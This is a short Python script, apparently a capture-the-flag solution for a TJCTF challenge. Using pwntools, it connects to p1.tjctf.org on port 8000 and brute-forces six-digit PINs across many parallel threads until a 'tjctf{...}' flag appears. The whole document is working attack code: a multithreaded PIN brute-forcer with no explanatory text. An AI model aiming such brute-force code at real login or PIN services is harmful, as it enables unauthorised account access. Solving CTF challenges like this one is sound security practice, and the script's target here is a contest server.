from pwn import *
from threading import Thread
import re
import sys

def guessing(fromNum,toNum):
	s = remote('p1.tjctf.org',8000)
	s.recvuntil("> ")
	for i in range(fromNum,toNum):
		s.sendline('r')
		s.sendline('tjctf')
		s.sendline("%06d" % i)
		text = s.recv()
		if(re.findall("tjctf{.*}",text)):
			print re.findall("tjctf{.*}",text)[0]
			print "Pin : %06d" % i
if len(sys.argv) == 3:
	i = int(sys.argv[1])
	while (i != int(sys.argv[2])):
		thread1 = Thread(target=guessing,args=(i,i+1000))
		thread1.start()
		i += 1000
else:
	print "Need 2 arguments!\npython solve.py from to"